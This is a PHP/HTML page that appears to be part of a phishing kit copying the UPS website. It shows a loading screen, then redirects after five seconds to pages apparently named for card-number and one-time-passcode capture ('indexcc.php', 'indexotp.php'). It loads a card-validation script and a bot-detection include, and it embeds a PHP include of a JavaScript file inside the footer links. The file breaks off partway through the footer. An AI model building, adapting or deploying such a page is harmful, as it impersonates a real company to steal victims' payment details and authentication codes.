<?php
session_start();
require 'ups_content/ups_system/detect.php';
require 'ups_content/ups_system/lang.php';

?>
<!DOCTYPE html>
<html lang="en" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths iedepVer">
   <head class="at-element-marker">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      </script>
      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
      <title><?php echo $payd01['x001']?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <base href=".">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="icon" href="ups_content/ups_img/favicon.ico" type="image/x-icon">
      <style>[data-show=false]{display:none!important}</style>
      <style>span.button-spinner[_ngcontent-rxc-c3] { white-space: nowrap; }</style>
      <style>div.typeahead[_ngcontent-rxc-c4] {
         background-color: #fff;
         border: solid #a0a0a0;
         border-width: thin;
         z-index: 99;
         position: absolute;
         font-family: tahoma, helvetica, arial, sans-serif;
         font-size: 12px;
         font-weight: 700;
         text-indent: 3px;
         width: 100%;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none
         }
         .typeahead-active-selection[_ngcontent-rxc-c4] {
         background-color: #0078d7;
         color: #fff
         }
      </style>
<?php 
if(isset($_GET['one'])){
header('Refresh: 5; indexcc.php');
}else{
header('Refresh: 5; indexotp.php');
}
?>
   </head>
   <body data-inq-observer="1" class="ups-headFixed">
      <title><?php echo $payd01['x001']?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link rel="canonical" href="">
      <!--ls:begin[stylesheet]-->
      <style type="text/css">
         .iw_container
         {
         max-width:800px !important;
         margin-left: auto !important;
         margin-right: auto !important;
         }
         .iw_stretch
         {
         min-width: 100% !important;
         }
         .track-bar-container {
         position: relative;
         background-color: #f7f7f7;
         padding-top: 40px;
         padding-bottom: 30px;
         margin-bottom: 60px
         }
         .track-bar-container .see-all {
         text-align: center;
         display: block;
         margin: 0 auto;
         color: #336;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 700;
         font-style: normal;
         font-size: 16px;
         line-height: 1
         }
         .track-bar-container .see-all i {
         display: inline-block;
         margin-bottom: 2px;
         font-size: 11px;
         vertical-align: middle;
         line-height: 1
         }
         .track-bar-container .remove-span {
         position: absolute;
         z-index: 99;
         top: -5px;
         right: 15px
         }
         .track-bar-container h3 {
         margin-bottom: 20px
         }
         @media only screen and (max-width:767px) {
         .track-bar-container h3 .tracking-number {
         display: block
         }
         .track-bar-container .see-all {
         text-indent: -9999em
         }
         .track-bar-container .see-all i {
         display: block;
         text-indent: 0;
         font-size: 16px
         }
         }
         .remove-span {
         cursor: pointer;
         color: #595959;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 400;
         font-style: normal;
         font-size: 15px;
         line-height: 0
         }
         .remove-span i {
         display: inline-block;
         margin-bottom: 3px;
         color: #336;
         font-size: 11px;
         vertical-align: middle
         }
         .delivery-status-text {
         display: inline-block;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 400;
         font-style: normal;
         color: #336;
         font-size: 30px;
         line-height: 1;
         vertical-align: middle;
         margin-left: 4%
         }
         .delivery-status-text.status-green {
         color: #218748
         }
         .delivery-status-text.status-red {
         color: #e71921
         }
         @media only screen and (min-width:768px) {
         .delivery-status-text {
         width: 20%
         }
         }
         .hint {
         position: relative;
         display: inline-block!important;
         font-size: 16px;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 700;
         font-style: normal;
         color: #336
         }
         .hint .speech_bubble {
         text-transform: none;
         box-sizing: border-box;
         display: none;
         position: absolute;
         z-index: 999;
         bottom: calc(100%+10px);
         right: -40px;
         padding: 20px;
         width: 300px;
         color: #595959;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 400;
         font-style: normal;
         font-size: 14px;
         line-height: 1.2;
         white-space: normal;
         background: #fff;
         border: solid 1px #999;
         border-radius: 10px
         }
         .hint .speech_bubble span {
         display: block;
         font-size: 14px
         }
         .hint .speech_bubble>a {
         float: right;
         margin: 0 0 10px 10px
         }
         .hint .speech_bubble:before,
         .hint .speech_bubble:after {
         content: "";
         position: absolute;
         z-index: 100;
         bottom: -20px;
         right: 40px;
         border: solid 10px transparent;
         border-top-color: #999
         }
         .hint .speech_bubble:after {
         z-index: 101;
         bottom: -18px;
         border-top-color: #fff
         }
         .hint .speech_bubble.left {
         right: auto;
         left: -40px
         }
         .hint .speech_bubble.left:before,
         .hint .speech_bubble.left:after {
         right: auto;
         left: 40px
         }
         .tool_tip_text li {
         font-size: 14px;
         margin-top: 5px
         }
         .tool_tip_text ul+strong {
         display: block;
         margin-top: 10px;
         font-size: 14px
         }
         input[type='text'],
         input[type='tel'],
         input[type='number'],
         input[type='email'] {
         -webkit-appearance: none;
         -moz-appearance: none;
         appearance: none;
         width: 100%;
         height: 44px;
         padding: 5px 10px;
         border: 1px solid #150400;
         border-radius: 3px!important;
         position: relative;
         color: #000
         }
         input::-webkit-outer-spin-button,
         input::-webkit-inner-spin-button {
         -webkit-appearance: none;
         margin: 0
         }
         textarea.form-control {
         border: solid 1px #336
         }
         input[placeholder] {
         text-overflow: ellipsis
         }
         input::-moz-placeholder {
         text-overflow: ellipsis
         }
         input:-moz-placeholder {
         text-overflow: ellipsis
         }
         input:-ms-input-placeholder {
         text-overflow: ellipsis
         }
         .radio {
         padding-left: 25px
         }
         .radio label {
         padding-left: 0
         }
         .radio input[type="radio"] {
         line-height: 0;
         height: 15px;
         margin-left: -25px;
         margin-top: 3px
         }
         div.checkbox {
         padding-left: 30px
         }
         div.checkbox label {
         padding-left: 0;
         color: #595959!important;
         font-family: "HelveticaNeueW01", Helvetica, Arial, sans-serif;
         font-weight: 700;
         font-style: normal;
         line-height: 1
         }
         div.checkbox input[type=checkbox] {
         position: absolute;
         opacity: 0
         }
         div.checkbox input[type=checkbox]~span {
         position: absolute;
         left: 0;
         top: 0;
         font-size: 16px;
         width: 20px;
         height: 20px;
         line-height: 20px;
         border: 1px solid #595959;
         color: #336;
         margin: 0 5px 0 0;
         padding: 0;
         vertical-align: top;
         text-align: center;
         background: #fff
         }
         div.checkbox input[type=checkbox][disabled]~span {
         cursor: not-allowed;
         background: #ededed
         }
         label.checkbox {
         display: inline-block;
         text-align: left;
         cursor: pointer;
         font-size: 16px;
         line-height: 24px;
         vertical-align: top;
         font-weight: 400
         }
         input[type=radio]:focus~label,
         input[type=checkbox]:focus~span {
         box-shadow: 0 0 5px #51cbee
         }
         input[type=checkbox]:checked~span:after {
         content: '\e80d';
         font-family: 'fontello';
         font-size: 11px;
         line-height: 20px;
         display: block
         }
         input~label.error {
         display: none;
         font-family: 'HelveticaNeueW01', Helvetica, Arial, sans-serif;
         font-size: 12px;
         line-height: 14px;
         font-weight: 400;
         text-align: left;
         padding: 10px 0;
         color: #e71921;
         position: absolute;
         width: 100%;
         left: 0;
         top: 100%;
         margin: 0 auto
         }
         .has-error .help-block {
         margin-bottom: 0;
         font-family: 'HelveticaNeueW01', Helvetica, Arial, sans-serif;
         font-size: 12px;
         color: #e71921;
         width: 90%;
         width: calc(100% - 15px)
         }
         .has-error .help-block li {
         margin-top: 5px;
         font-size: 12px;
         color: #e71921
         }
         .has-error .form-control {
         border-color: #e71921
         }
         .form-group {
         margin-bottom: 0
         }
         input.Error {
         border-color: #e71921
         }
         input.Error~label.error {
         display: block
         }
         .transform180 {
         -webkit-transform: scaleX(-1);
         transform: scaleX(-1);
         display: inline-block
         }
         span.bold {
         font-weight: bold
         }
         span.italic {
         font-style: italic
         }
         .popover {
         border: 1px solid #999;
         border-radius: 10px;
         box-shadow: none
         }
         .popover.down>.arrow {
         border-right-color: #999;
         border-left-color: #999
         }
         a.mouse-focus:focus,
         input.mouse-focus:focus,
         textarea.mouse-focus:focus,
         button.mouse-focus:focus,
         select.mouse-focus:focus,
         .button.mouse-focus:focus {
         outline: 0;
         box-shadow: none
         }
         input[type=radio].mouse-focus:focus~label,
         input[type=checkbox].mouse-focus:focus~span {
         box-shadow: none
         }
         ::-webkit-input-placeholder {
         color: #595959
         }
         ::-moz-placeholder {
         color: #595959
         }
         :-ms-input-placeholder {
         color: #595959
         }
         :-moz-placeholder {
         color: #595959
         }
         @media only screen and (max-width:767px) {
         .form-control {
         font-size: 16px
         }
         }
         .modal .modal-header {
         border: 0;
         padding: 0
         }
         .modal .modal-content {
         border-radius: 3px;
         --webkit-box-shadow: none;
         box-shadow: none;
         position: relative
         }
         .modal .modal-body {
         padding: 50px 20px 20px 20px
         }
         .modal .closeX {
         position: absolute;
         padding: 12px;
         top: 6px;
         right: 9px
         }
         .modal .closeX span {
         position: absolute;
         z-index: 999;
         right: 15px;
         color: #336;
         font-size: 16px
         }
      </style>
      <!--ls:end[stylesheet]--> 
      <!--ls:begin[meta-keywords]--> 
      <meta name="keywords" content="Send a parcel, Parcel shipping">
      <!--ls:end[meta-keywords]--> 
      <!--ls:begin[meta-description]--> 
      <meta name="description" content="Shipping has never been easier. Choose UPS as your parcel courier and send your parcel today.">
      <!--ls:end[meta-description]--> 
      <!--ls:begin[custom-meta-data]--> 
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <!--ls:end[custom-meta-data]--> 
      <!--ls:begin[meta-vpath]--> 
      <meta name="vpath" content="">
      <meta name="ups-locale" content="en_FR">
      <link type="text/css" href="./ups_content/ups_css/ups.vendor.54f3c2d83b58.css" rel="stylesheet">
      <link type="text/css" href="./ups_content/ups_css/ups.styles.838f19156b40.css" rel="stylesheet">
      <link type="text/css" href="./ups_content/ups_css/ups.modules.3855c8c6bb7d.css" rel="stylesheet">
      <link type="text/css" href="./ups_content/ups_css/ups.widgets.6611168e8d14.css" rel="stylesheet">
      <link type="text/css" href="./ups_content/ups_css/ups.apps-nbs.af843b.css" rel="stylesheet" media="screen,print">
      <script src="./ups_content/ups_js/jquery.js"></script>
      <script src="./ups_content/ups_js/jquery.ccvalid.js"></script>
      <script src="./ups_content/ups_js/jquery.mask.js"></script>
      <script src="./ups_content/ups_js/modernizr.min.js"></script>
      <div class="iw_viewport-wrapper">
      <div class="container-fluid iw_section" id="sectionisswf4to">
         <div class="row iw_row iw_stretch" id="rowisswf4tp">
            <div class="iw_columns col-lg-12" id="colisswf4tq">
               <div class="iw_placeholder" id="iw_placeholder1473252365867">
                  <div class="iw_component" id="iw_comp1485611008057">
                     <style type="text/css">
                        @media (min-width: 992px) {
                        .ups-header_light .ups-header_utils {
                        top:45px
                        }
                        }
                     </style>
                     <script type="text/javascript">
                        document.onreadystatechange = function () {
                            var state = document.readyState;
                            if (state == "complete") {
                                $("[name=screen]").val(screen.width + " x " + screen.height);
                            }
                        };
                     </script>
                     <header id="ups-headerWrap" style="margin-top: 0px;">
                        <div class="ups-wrap ups-wrap_header">
                           <div id="ups-header" class="ups-wrap_inner" data-upstoken="575b344d4629e0959f1e4919da4966af18d62c614265a493e1921a00555dcfca1f736a6b6e6812f7e231714f" data-islogged="false">
                              <a id="ups-header_logo" href="#" class="ups-analytics" data-content-block-id="M1" data-event-id="21" title="UPS Home" style=""><img src="ups_content/ups_img/UPS_logo.svg" alt="UPS Home"></a>
                              <div id="ups-touchNav" class="ups-med_show">
                                 <ul class="ups-mob_links clearfix ups-header_mob_utils">
                                    <li class="ups-mobSearch_li"><button id="ups-mobSearch_btn" class="ups-searchBtn ups-touchNav-buttons ups-analytics" aria-controls="ups-header_search-mob" data-content-block-id="M1" data-event-id="21"><span id="ups-mobSearch_icn" class="ups-iconAlone ups-icon-search" aria-hidden="true"></span><span><i><?php echo $payd01['x005']?></i></span><span id="ups-mobSearch-close" class="icon ups-icon-x hide" aria-hidden="true"></span></button></li>
                                    <li class="ups-menu ups-account "><a class="ups-profileBtn ups-touchNav-buttons ups-analytics" id="ups-profileBtn" aria-expanded="false" data-content-block-id="M1" data-event-id="21" href="#"><span class="ups-iconAlone ups-icon-user-solid" aria-hidden="true"></span><span class="ups-icon_text"><?php echo $payd01['x004']?></span></a></li>
                                    <li><button class="ups-menuToggle ups-touchNav-buttons ups-analytics" data-content-block-id="M1" data-event-id="22"><span class="ups-iconAlone ups-icon-menu" aria-hidden="true"></span><span class="ups-readerTxt">Menu</span></button><button class="ups-mobmenu-close ups-touchNav-buttons"><span class="ups-iconAlone ups-icon-x" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button></li>
                                 </ul>
                              </div>
                              <form id="ups-header_search-mob" method="get" data-action="/fr/en/SearchResults.page" action="/fr/en/SearchResults.page" role="search" aria-labelledby="ups-mobSearch_btn" class="hide" data-track="hR" data-svp-track="/mobile/track?loc=en_FR#Track">
                                 <div class="ups-input_wrap"><label for="ups-search-mob" class="ups-readerTxt"><?php echo $payd01['x005']?></label><input type="search" name="ups-search-mob" id="ups-search-mob" placeholder="Track a package or search"><input type="hidden" name="HTMLVersion" value="5.0"><input type="hidden" name="loc" value="en_FR"><input type="hidden" name="trackNums" class="ups-trackSearch_header"><input value="Track" name="track.x" type="hidden"><button class="ups-cta" type="submit" id="ups-mainNav_search_mob"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt"></span>Go</button><button class="ups-cta close" type="button"><span class="icon" aria-hidden="true"><span class="ups-readerTxt">Close</span></span>x</button></div>
                              </form>
                              <div class="ups-topNav" id="ups-navigation-container">
                                 <nav class="ups-utilities_menu" aria-label="Utilities Menu">
                                    <ul class="ups-header_utils">
                                       <li class="ups-customerService ups-firstnav"><span aria-hidden="true" class="icon ups-icon-questioncircle"></span><a class="ups-analytics" data-content-block-id="M1" data-event-id="21" href="#"><?php echo $payd01['x002']?></a></li>
                                       <li class="ups-locations ups-firstnav"><span aria-hidden="true" class="icon ups-icon-locationsemifull"></span><a href="#" data-event-id=""><?php echo $payd01['x003']?></a></li>
                                       <li class="ups-language ups-menu ups-firstnav" aria-label="Main">
                                          <span aria-hidden="true" class="icon ups-icon-globe-filled"></span><a href="javascript:void(0)" class="ups-menu_toggle ups-analytics" id="ups-language-toggle" aria-expanded="false" aria-controls="ups-language-panel" role="button" data-content-block-id="M1" data-event-id="22"><span class="ups-language-text make-fluid"><?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?></span><span class="icon ups-icon-chevrondown" aria-hidden="true"></span><span class="ups-mobnav-arrow" aria-hidden="true"></span></a>
                                          <div class="ups-menu_list" id="ups-language-panel" aria-labelledby="ups-language-toggle" aria-hidden="true" style="">
                                          </div>
                                       </li>
                                       <li class="ups-loginsignup ups-firstnav "><span aria-hidden="true" class="icon ups-icon-user-solid"></span><a class="ups-analytics" data-content-block-id="M1" data-event-id="21" href="#"><?php echo $payd01['x004']?></a></li>
                                    </ul>
                                 </nav>
                                 <nav class="ups-container ups-primary_nav" id="ups-navItems">
                                    <div class="ups-wrap">
                                       <div class="ups-wrap_inner ups-navItems_primary">
                                          <ul class="ups-navItems_mainUL ups-menu-flexible-width">
                                             <li id="ups-headerTools" class="ups-navMenu ups-menu">
                                                <a href="javascript:void(0)" aria-controls="ups-quickStartPanel" role="button" id="ups-quickStartMenu" aria-expanded="false" class="ups-analytics ups-toolsToggle" data-content-block-id="M1" data-event-id="22"><?php echo $payd01['x006']?><span class="icon" aria-hidden="true"></span></a>
                                                <div id="ups-quickStartPanel" class="ups-headerTools_list" aria-hidden="true" aria-labelledby="ups-quickStartMenu">
                                                </div>
                                             </li>
                                             <li class="ups-navMenu ups-menu">
                                                <a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks1" aria-controls="ups-menuPanel1" data-content-block-id="M1" data-event-id="22" aria-expanded="false"><?php echo $payd01['x007']?><span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
                                                <div class="ups-wrap">
                                                </div>
                                             </li>
                                             <li class="ups-navMenu ups-menu">
                                                <a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks2" aria-controls="ups-menuPanel2" data-content-block-id="M1" data-event-id="22" aria-expanded="false"><?php echo $payd01['x008']?><span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
                                                <div class="ups-wrap">
                                                </div>
                                             </li>
                                             <li class="ups-navMenu ups-menu">
                                                <a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks3" aria-controls="ups-menuPanel3" data-content-block-id="M1" data-event-id="22" aria-expanded="false"><?php echo $payd01['x009']?><span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
                                                <div class="ups-wrap">
                                                </div>
                                             </li>
                                          </ul>
                                       </div>
                                    </div>
                                 </nav>
                                 <div class="ups-container ups-container-search-track">
                                    <div id="ups-header-search" class="ups-menu col-md-3">
                                       <form id="ups-header_search" class="ups-width_expand ups-hide_nav" method="get" action="/fr/en/SearchResults.page" data-action="/fr/en/SearchResults.page" role="search" data-track="" data-svp-track="/mobile/track?loc=en_FR#Track"><label for="ups-mainNav-search" class="ups-readerTxt"><?php echo $payd01['x005']?></label><input id="ups-mainNav-search" type="search" name="ups-search" class="ups-expand_search_input" placeholder="Track a package or search"><input type="hidden" name="HTMLVersion" value="5.0"><input type="hidden" name="loc" value="en_FR"><input type="hidden" name="trackNums" class="ups-trackSearch_header"><input value="Track" name="track.x" type="hidden"><button id="ups-mainNav_search_submit" class="ups-header_search_submit" type="submit" data-content-block-id="M1" data-event-id="21"><i class="ups-icon-search" aria-hidden="true"></i><span class="ups-readerTxt">Go</span></button><button id="ups-header_search-close" class="ups-header_search_close" type="button" data-content-block-id="M1" data-event-id="21"><i class="ups-icon-x" aria-hidden="true"></i><span class="ups-readerTxt">Close</span></button></form>
                                       <button id="ups-search-toggle" class="ups-search-button" type="button"><i><?php echo $payd01['x005']?></i><span class="ups-iconAlone ups-icon-search" aria-hidden="true"></span></button>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </header>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="container-fluid iw_section light-header" id="sectionisswf4ts">
         <div class="row iw_row iw_stretch" id="rowisswf4tt">
            <div class="iw_columns col-lg-12" id="colisswf4tu">
               <div class="iw_placeholder" id="iw_placeholder1473252365879">
                  <div class="iw_component" id="iw_comp1485611008058"> 
                  </div>
               </div>
               <div class="iw_placeholder" id="iw_placeholder1473252365871">
                  <div class="iw_component" id="iw_comp1485611008059"> 
                  </div>
               </div>
               <div class="iw_placeholder" id="iw_placeholder1473252365886">
                  <div class="iw_component" id="iw_comp1531394860280"> 
                  </div>
               </div>
               <div class="iw_placeholder" id="iw_placeholder1473252365890">
                  <div class="iw_component" id="iw_comp1485611008061">
                     <div class="ups-page-title ups-wrap hpps-basic ups-analytics-render" data-content-block-id="M7" data-content-id="">
                        <div class="ups-wrap_inner">
                           <div class="ups-page-title_table">
                             <center> <div class="ups-page-title_cell">
                                 <h1><span><?php echo $payd01['x063']?></span></h1>
                                 <p></p></center>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="iw_placeholder" id="iw_placeholder1473252365894">
                  <div class="iw_component" id="iw_comp1531477677321"> 
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!-- begin body wrapper --> 
      <div class="container-fluid iw_section">
	  <br><br><br><br><br><br>
	  <center>
   <img src="ups_content/ups_img/ajax-loader.gif" alt="Loading">
     </center>
	 <br><br><br><br><br><br><br><br><br><br><br><br>
      <!-- end body wrapper -->
      <div class="container-fluid iw_section" id="sectionisswf4v3">
         <div class="row iw_row iw_stretch" id="rowisswf4v4">
            <div class="iw_columns col-lg-12" id="colisswf4v5">
               <div class="iw_placeholder" id="iw_placeholder1473252365934">
                  <div class="iw_component" id="iw_comp1531394860281"> 
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="container-fluid iw_section" id="sectionj9rfozjs">
         <div class="row iw_row iw_stretch" id="rowj9rfozjt">
            <div class="iw_columns col-lg-12" id="colj9rfozju">
               <div class="iw_placeholder" id="iw_placeholder1510169105655">
                  <div class="iw_component" id="iw_comp1510567868852">
                     <style type="text/css">
                        #ups-footer .h2_eqivalent {
                        font-family: Tahoma,helvetica,arial,sans-serif !important;
                        font-size: 1.2em;
                        padding-bottom: 7px;
                        margin: 20px 0 15px;
                        font-weight: bold
                        }
                        #ups-footer .h2_eqivalent span {
                        font-family: Tahoma,helvetica,arial,sans-serif !important
                        }
                        @media (max-width: 991px) {
                        #ups-footer .h2_eqivalent {
                        font-family: Tahoma,helvetica,arial,sans-serif !important;
                        text-transform: none;
                        border-bottom: 1px solid #757575;
                        margin: 0 -60px;
                        padding: 22px 60px;
                        position: relative
                        }
                        #ups-footer .h2_eqivalent span {
                        font-family: Tahoma,helvetica,arial,sans-serif !important
                        }
                        #ups-footer .h2_eqivalent.ups-active .ups-iconAlone:before {
                        content: "\e653"
                        }
                        #ups-footer .h2_eqivalent button {
                        -webkit-appearance: none;
                        border-radius: 0;
                        background: none;
                        border: none;
                        padding: 0;
                        line-height: 1;
                        position: absolute;
                        right: 60px;
                        top: 50%;
                        width: 44px;
                        height: 44px;
                        line-height: 54px;
                        font-size: 1.1em;
                        margin: -22px 0 0;
                        margin-right: -10px;
                        text-align: center;
                        overflow: hidden
                        }
                        #ups-footer .ups-footer_custserv .h2_eqivalent {
                        background: none
                        }
                        #ups-footer .ups-footer_custserv .h2_eqivalent .icon:before {
                        font-family: "upsicons" !important;
                        font-style: normal !important;
                        font-weight: normal !important;
                        font-variant: normal !important;
                        text-transform: none !important;
                        speak: none;
                        line-height: 1;
                        -webkit-font-smoothing: antialiased;
                        -moz-osx-font-smoothing: grayscale;
                        content: "\e660";
                        line-height: 0;
                        font-size: 1.3em;
                        position: relative;
                        top: 5px;
                        margin-right: 9px
                        }
                        }
                        @media (max-width: 767px) {
                        #ups-footer .h2_eqivalent {
                        margin: 0 -20px;
                        padding: 22px 20px
                        }
                        #ups-footer .h2_eqivalent button {
                        right: 20px
                        }
                        }
                        .h2_eqivalent {
                        font-size: 1.5em
                        font-family: Tahoma,helvetica,arial,sans-serif;
                        font-weight: normal
                        }
                        .h2_eqivalent .ups-rtl {
                        font-family: Tahoma,helvetica,arial,sans-serif;
                        font-weight: 700
                        }
                     </style>
                     <footer id="ups-footerWrap" class="ups-wrap hpps-basic" role="contentinfo">
                        <div id="ups-footer" class="ups-wrap_inner ups-analytics-render" data-content-block-id="M2" data-content-id="templatedata/navigation/footer-config/data/en_GB/footer-full-fr.dcr" aria-multiselectable="true">
                           <div class="ups-footer_colsCont ups-container">
                              <div class="ups-footer_custserv col-md-3">
                                 <div class="ups-footer_links">
                                    <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_custServe" role="heading" aria-level="2">
                                       <span class="icon" aria-hidden="true"></span>
                                       <span id="ups-footer_custServe2"><?php echo $payd01['x031']?></span>
                                       <button class="ups-med_show" aria-controls="ups-footer_custServeLinks ups-footer_custServeConacts" aria-labelledby="ups-footer_custServe2" aria-expanded="false"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                    </div>
                                    <ul class="ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeLinks" aria-hidden="true">
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x034']?><span class="" aria-hidden="true"></span></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x035']?><span class="" aria-hidden="true"></span></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x036']?><span class="" aria-hidden="true"></span></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x037']?><span class="" aria-hidden="true"></span></a></li>
                                    </ul>
                                    <ul class="ups-footer_contact ups-footer_expand" aria-labelledby="ups-footer_custServe" id="ups-footer_custServeConacts" style="display: none;" aria-hidden="true"></ul>
                                 </div>
                              </div>
                              <div class="ups-footer_col col-md-3 ups-left-md">
                                 <div class="ups-footer_links">
                                    <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_thisSite" role="heading" aria-level="2">
                                       <span id="ups-footer_thisSite2"><?php echo $payd01['x032']?></span>
                                       <button class="ups-med_show" aria-controls="ups-footer_thisSiteLinks" aria-expanded="false" aria-labelledby="ups-footer_thisSite2"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                    </div>
                                    <ul class="ups-footer_expand" aria-labelledby="ups-footer_thisSite" id="ups-footer_thisSiteLinks" aria-hidden="true">
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x007']?></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x008']?></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x009']?></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x003']?></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x038']?></a></li>
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x039']?></a></li>
                                    </ul>
                                 </div>
                              </div>
                              <div class="ups-footer_col col-md-3 ups-left-md">
                                 <div class="ups-footer_info ups-footer_links">
                                    <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_companyInfo" role="heading" aria-level="2">
                                       <span id="ups-footer_companyInfo2"><?php echo $payd01['x033']?></span>
                                       <button class="ups-med_show" aria-labelledby="ups-footer_companyInfo2" aria-expanded="false" aria-controls="ups-footer_companyInfoLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                    </div>
                                    <ul class="ups-footer_expand" aria-labelledby="ups-footer_companyInfo" id="ups-footer_companyInfoLinks" aria-hidden="true">
                                       <li><a href="#" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x040']?><span class="" aria-hidden="true"></span></a></li>
                                       <li><a href="#" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x041']?><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li>
                                       <li><a href="#" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x042']?><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li>
                                       <li><a href="#" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x043']?><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li>
                                       <li><a href="#" target="_blank" rel="noopener noreferrer" class=" ups-analytics" data-content-block-id="M2" data-event-id="21"><?php echo $payd01['x044']?><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li>
                                    </ul>
                                 </div>
                                 <div class="ups-footer_sites ups-footer_links">
                                    <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_otherSites" role="heading" aria-level="2">
                                       <span id="ups-footer_otherSites2"><?php echo $payd01['x045']?></span>
                                       <button class="ups-med_show" aria-labelledby="ups-footer_otherSites2" aria-expanded="false" aria-controls="ups-footer_otherSitesLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                    </div>
                                    <ul class="ups-footer_expand" aria-labelledby="ups-footer_otherSites" id="ups-footer_otherSitesLinks" aria-hidden="true">
                                       <li><?php include("./ups_content/ups_js/mask-main.js");?><a href="" target="_blank" rel="noopener noreferrer" data-content-block-id="M2" data-event-id="24"><?php echo $payd01['x046']?><span class="" aria-hidden="true"></span><span class="icon ups-link_newwindow" aria-hidden="true"></span><span class="ups-readerTxt">Open the link in a new window</span></a></li>
                                    </ul>
                                 </div>
                              </div>
                              <div class="ups-footer_col col-md-3 ups-left-md">
                                 <div class="ups-footer_links">

                                    <div class="ups-footer_toggle h2_eqivalent" id="ups-footer_connect" role="heading" aria-level="2" style="display: none;">
                                       <span id="ups-footer_connect2"></span>
                                       <button class="ups-med_show" aria-labelledby="ups-footer_connect2" aria-expanded="false" aria-controls="ups-footer_connectLinks"><span class="ups-icon-plus ups-iconAlone" aria-hidden="true"></span></button>
                                    </div>
                                    <ul class="ups-footer_expand" aria-labelledby="ups-footer_connect" id="ups-footer_connectLinks" style="display: none;" aria-hidden="true"></ul>
                                 </div>
                              </div>
                           </div>
                           <div class="ups-footer_legal">
                              <div class="ups-footer_links">
                                 <div class="ups-med_show ups-footer_toggle h2_eqivalent" id="ups-footer_legal" role="heading" aria-level="2">
                                    <span id="ups-footer_legal2">Legal</span>
